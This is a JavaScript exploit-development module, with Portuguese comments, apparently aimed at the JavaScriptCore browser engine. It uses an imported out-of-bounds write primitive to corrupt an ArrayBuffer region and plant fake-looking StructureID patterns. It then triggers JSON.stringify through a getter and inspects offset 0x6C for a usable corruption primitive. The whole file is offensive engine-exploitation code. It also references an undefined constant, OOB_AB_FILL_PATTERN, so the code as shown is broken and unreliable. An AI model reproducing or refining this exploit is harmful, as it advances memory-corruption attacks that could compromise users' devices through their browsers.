// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CAnalysis";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    writes_at_0x6C: [], details: ""
};

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_TARGET_WRITE_OFFSET = 0x6C; // Onde a escrita foi observada
const OOB_AB_SNOOP_SIZE = 0x100; // Sondar primeiros 256 bytes

// Diferentes padrões para preencher em 0x6C
const FILL_PATTERNS_FOR_0x6C = [
    0xFEFEFEFE, 
    0xCDCDCDCD, 
    0x12345678, 
    0x00000000,
    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 2 // Tentar com um StructureID válido
];


let global_object_for_stress_payload; 

class CheckpointFor0x6CAnalysis {
    constructor(id) {
        this.id_marker = `Analyse0x6CChkpt-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "Analyse0x6C_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results.message = "Getter chamado, analisando escrita em 0x6C.";
        let details_log_g = [];
        let leak_found_this_run = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB não disponíveis.");
            }

            // 1. Objeto de stress para o JSON.stringify interno
            if (!global_object_for_stress_payload) { // Deve ser definido no runner
                 global_object_for_stress_payload = {default_data: "GetterFallbackData"};
            }
            let stress_obj = {
                title: "StressFor0x6C",
                target: global_object_for_stress_payload,
                s1: "S".repeat(100),
                arr: [1,2,3,global_object_for_stress_payload,5,6],
                s2: "T".repeat(100)
            };
            details_log_g.push(`Objeto de stress (contendo global_object_for_stress_payload ID: ${global_object_for_stress_payload.unique_id}) pronto.`);

            // 2. Chamar JSON.stringify internamente
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
            try { JSON.stringify(stress_obj); } catch (e_json_int) {
                 details_log_g.push(`Erro no stringify interno: ${e_json_int.message}`);
            }
            details_log_g.push(`Stringify interno chamado.`);
            
            // 3. Ler o valor em OOB_AB_TARGET_WRITE_OFFSET (0x6C)
            logS3(`DENTRO DO GETTER: Lendo QWORD de oob_data[${toHex(OOB_AB_TARGET_WRITE_OFFSET)}]...`, "info", FNAME_GETTER);
            const value_at_0x6C = oob_read_absolute(OOB_AB_TARGET_WRITE_OFFSET, 8); // Ler 8 bytes
            const value_str_0x6C = value_at_0x6C.toString(true);
            details_log_g.push(`Valor em ${toHex(OOB_AB_TARGET_WRITE_OFFSET)}: ${value_str_0x6C}`);
            logS3(`Valor em oob_data[${toHex(OOB_AB_TARGET_WRITE_OFFSET)}] = ${value_str_0x6C}`, "leak", FNAME_GETTER);
            current_test_results.writes_at_0x6C.push({pattern_before: "N/A_IN_GETTER_LOOP", value_after_stringify: value_str_0x6C});

            if (value_at_0x6C.high() === 0xFFFFFFFF && value_at_0x6C.low() !== OOB_AB_FILL_PATTERN) {
                 logS3(`CONFIRMADO: 0x6C alto é 0xFFFFFFFF, baixo é ${toHex(value_at_0x6C.low())}. Era o padrão?`, "vuln", FNAME_GETTER);
                 leak_found_this_run = true;
                 // Se value_at_0x6C.low() for o offset de uma estrutura falsa que plantamos, temos um primitivo!
            } else if (!value_at_0x6C.equals(new AdvancedInt64(OOB_AB_FILL_PATTERN, OOB_AB_FILL_PATTERN))) { // Assumindo que o padrão era 8 bytes
                 logS3(`Valor em 0x6C (${value_str_0x6C}) é diferente do padrão, mas não é FFFFFFFF_xxxxxxxx.`, "warn", FNAME_GETTER);
                 // leak_found_this_run = true; // Pode ser interessante
            }


            if (leak_found_this_run) {
                current_test_results.success = true;
                current_test_results.message = `Escrita em ${toHex(OOB_AB_TARGET_WRITE_OFFSET)} detectada e/ou confirmada: ${value_str_0x6C}.`;
            } else {
                current_test_results.message = `Nenhuma escrita anômala em ${toHex(OOB_AB_TARGET_WRITE_OFFSET)} detectada ou confirmada como útil. Valor: ${value_str_0x6C}`;
            }
            current_test_results.details = details_log_g.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
        }
        return { "getter_0x6C_analysis_done": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointFor0x6CAnalysis.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_0x6C_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "execute0x6CWriteAnalysisRunner";
    logS3(`--- Iniciando Teste de Análise da Escrita em 0x6C ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false; // Reset para cada chamada de executeRetypeOOB_AB_Test
    let overall_summary = [];

    for (const pattern_to_set_at_0x6C of FILL_PATTERNS_FOR_0x6C) {
        logS3(`INICIANDO SUB-TESTE: Padrão em ${toHex(OOB_AB_TARGET_WRITE_OFFSET)} será ${toHex(pattern_to_set_at_0x6C)}`, "subtest", FNAME_TEST_RUNNER);
        current_test_results = { success: false, message: `Testando com padrão ${toHex(pattern_to_set_at_0x6C)}`, error: null, writes_at_0x6C: [], details: ""};
        getter_called_flag = false; // Reset para cada sub-teste

        try {
            await triggerOOB_primitive();
            if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute) { throw new Error("OOB Init falhou"); }
            logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
            
            // 1. Preencher OOB_AB_TARGET_WRITE_OFFSET (0x6C) com o padrão de teste (4 bytes)
            //    e o resto da área de sondagem com OOB_AB_FILL_PATTERN
            const fill_limit = Math.min(OOB_AB_SNOOP_SIZE, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) continue; // Gatilho
                if (offset >= OOB_AB_TARGET_WRITE_OFFSET && offset < OOB_AB_TARGET_WRITE_OFFSET + 4) {
                    oob_write_absolute(offset, pattern_to_set_at_0x6C, 4);
                } else {
                    try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN, 4); } catch(e){}
                }
            }
            logS3(`oob_ab preenchido. ${toHex(OOB_AB_TARGET_WRITE_OFFSET)} = ${toHex(pattern_to_set_at_0x6C)}.`, "info", FNAME_TEST_RUNNER);
            
            // 2. Objeto alvo global para o stress_obj no getter
            global_object_for_stress_payload = { "unique_id": 0xC0FFEE00 + pattern_to_set_at_0x6C };

            // 3. Escrita OOB Gatilho em 0x70
            oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
            logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

            const checkpoint_obj = new CheckpointFor0x6CAnalysis(1);
            logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
            
            JSON.stringify(checkpoint_obj); // Aciona o getter

        } catch (mainError_runner) { 
            current_test_results.message = `Erro CRÍTICO no runner: ${mainError_runner.message}`;
            current_test_results.error = String(mainError_runner);
            logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
        } finally {
            logS3(`FIM DO SUB-TESTE com padrão ${toHex(pattern_to_set_at_0x6C)} em ${toHex(OOB_AB_TARGET_WRITE_OFFSET)}`, "subtest", FNAME_TEST_RUNNER);
            if (getter_called_flag) {
                logS3(`  Resultado: Success=${current_test_results.success}, Msg=${current_test_results.message}`, current_test_results.success ? "vuln" : "warn", FNAME_TEST_RUNNER);
                current_test_results.writes_at_0x6C.forEach(item => {
                    logS3(`    ${toHex(OOB_AB_TARGET_WRITE_OFFSET)} ANTES (padrão): ${toHex(pattern_to_set_at_0x6C)}, DEPOIS (Stringifier): ${item.value_after_stringify}`, "leak", FNAME_TEST_RUNNER);
                });
            } else {
                logS3(`  Resultado: GETTER NÃO FOI CHAMADO. Msg: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
            }
            overall_summary.push({pattern_at_0x6C: toHex(pattern_to_set_at_0x6C), results: JSON.parse(JSON.stringify(current_test_results)) }); // Deep copy
            clearOOBEnvironment();
            global_object_for_stress_payload = null;
            await PAUSE_S3(200); // Pausa entre sub-testes
        }
    }

    // Log do Sumário Geral
    logS3("==== SUMÁRIO GERAL DO TESTE DE ESCRITA EM 0x6C ====", "test", FNAME_TEST_RUNNER);
    overall_summary.forEach(res_item => {
        logS3(`Padrão Inicial em ${toHex(OOB_AB_TARGET_WRITE_OFFSET)}: ${res_item.pattern_at_0x6C}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Getter Chamado: ${res_item.results.message.startsWith("Getter chamado") || res_item.results.success}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Sucesso do Teste: ${res_item.results.success}`, res_item.results.success ? "vuln" : "info", FNAME_TEST_RUNNER);
        logS3(`  Mensagem: ${res_item.results.message}`, "info", FNAME_TEST_RUNNER);
        if(res_item.results.writes_at_0x6C && res_item.results.writes_at_0x6C.length > 0){
            logS3(`  Valores Finais em ${toHex(OOB_AB_TARGET_WRITE_OFFSET)}:`, "leak", FNAME_TEST_RUNNER);
            res_item.results.writes_at_0x6C.forEach(w => logS3(`    ${w.value_after_stringify}`, "leak", FNAME_TEST_RUNNER));
        }
        if (res_item.results.error) logS3(`  Erro: ${res_item.results.error}`, "error", FNAME_TEST_RUNNER);
        logS3("----------------------------------------------------", "info", FNAME_TEST_RUNNER);
    });

    logS3(`--- Teste de Análise da Escrita em 0x6C Concluído ---`, "test", FNAME_TEST_RUNNER);
}
